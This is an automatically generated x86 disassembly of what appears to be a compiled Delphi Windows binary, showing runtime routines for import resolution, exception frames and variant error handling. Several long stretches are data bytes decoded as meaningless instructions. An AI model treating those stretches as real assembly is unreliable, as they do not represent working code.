mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40af38
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9c5
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40d9d0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da2a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409718
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da31
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40da3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40daa9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4042c0
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408470
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dab0
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_40dabc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db1c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409674
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404864
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db23
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40db2c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db8c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a6c4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404864
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db93
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40db9c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dc00
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_40850c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404864
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc07
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40dc30
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dc5c
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d7cc
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7fc
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7fc
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d808
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d814
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d820
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d88c
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8f8
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d964
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9d0
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da3c
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dabc
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db2c
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db9c
mov eax r-xdata
call sub_40dc30
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40df68
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40df8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df94
retn
sub_40e0c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc cl ah
inc eax
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
jb r-xdata
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0040e2 ]
outsd
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xe2
outsd
jb r-xdata
cmp al 0xe2
inc eax
inc ebx
popad
jb r-xdata
je r-xdata
adc eax 0x72615645
jns r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
sar [ edx ] 0x40
rcr al 0xe1
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
inc ebp
push esi
popad
jb r-xdata
add al bl
xor al [ eax ]
push ss
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
jb r-xdata
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
inc eax
xor eax 0x35440040
inc eax
inc eax
add al bl
xor al [ eax ]
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ 0x72615645 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
loope r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
lea eax [ eax ]
adc cl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
loope r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl bl 0x1
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0040e3
add [ eax ] al
add [ edx + edi * 2 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
loop r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x40 ] dh
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
inc eax
nop
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esi ] dl
add [ esi + 0x35400040 ] bh
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ esi + 0x35400040 ] bh
jb r-xdata
outsb
je r-xdata
popad
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
shr [ eax - 0x1d ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1d ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
jecxz r-xdata
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ edx + edi * 2 ] ah
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e2 ] ah
inc ebp
jb r-xdata
xor [ edx ] 0x40
outsd
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ esp + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
in al 0x40
add [ eax + eax ] cl
popad
jb r-xdata
popad
jns r-xdata
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ 0x72615645 ] dl
add [ eax ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe3
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
insd
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax * 2 + 0x69726156 ] dl
jb r-xdata
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ eax ] al
jb r-xdata
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add al bl
xor al [ eax ]
adc eax 0x72615645
outsb
js r-xdata
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ eax ] bh
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
in al 0x40
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
push 0x40e5
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe5
inc eax
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0040 ] al
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add al dl
jecxz r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5d1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40e663
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4135a0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4135a0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e66a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ 0x72615645 ] dl
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0xc0040 ] bl
outsd
add [ edx + esi + 0x32d80040 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jecxz r-xdata
push 0x0
rcl [ ebp - 0x75 ] 0xec
xor eax eax
push ebp
push sub_40e5ca
push [ fs : eax ]
add [ eax ] al
add [ eax ] al
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add [ eax + eax ] cl
add [ eax ] al
and al 0x7a
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
sub_40e580
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5ca
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5d1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40e5d4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e663
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4135a0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4135a0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e66a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
sub_40e670
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e6ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6c1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40e6c4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e753
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4135a0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4135a0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e75a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40405c
retn
sub_40e760
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e7aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7b1
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40e7b4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e9f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea00
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_40405c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
dec eax
je r-xdata
call sub_40e580
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
jmp r-xdata
call sub_40e670
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40afc4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
jmp r-xdata
jmp r-xdata
sub_40ea14
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e5d4
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e6c4
jmp r-xdata
jmp r-xdata
call sub_40e7b4
sub_40ea48
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4027fc
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
call sub_4027fc
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ea14
pop esi
pop ebx
retn
call sub_4027fc
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ea14
jmp r-xdata
call sub_40283c
mov edx eax
mov eax edx
call sub_403a74
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ea14
jmp r-xdata
pop esi
pop ebx
retn
sub_40eacc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb16
push [ fs : eax ]
mov [ fs : eax ] esp
